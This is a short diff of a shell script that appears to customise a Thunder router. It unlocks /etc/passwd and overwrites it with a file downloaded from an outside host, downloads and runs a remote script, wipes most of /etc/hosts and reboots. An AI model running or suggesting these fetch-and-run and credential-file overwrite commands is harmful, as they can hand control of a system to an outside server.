@@ -10,7 +10,7 @@ chattr -i /etc/passwd*;
 
 wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
 
-/thunder/bin/ubus call dcdn set_dcdn_client '{"count":1}'
+#/thunder/bin/ubus call dcdn set_dcdn_client '{"count":1}'
 rm -rf /root/update_cache* #消除定时清缓存脚本
 
 if [ -d /opt/etc ];then
@@ -33,9 +33,7 @@ else
 fi
 
 wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;
-
-(nslookup twin13034.sandai.net | tail -n 1 | head -n 1|awk -F':' '{print $2}'|awk '{print $1" kjapi.peiluyou.com"}'>>/etc/hosts && killall remote 2>&1 &)
+sed -i '3,$d' /etc/hosts;
 
 sleep 30
-sed -i '3,$d' /etc/hosts;
 reboot
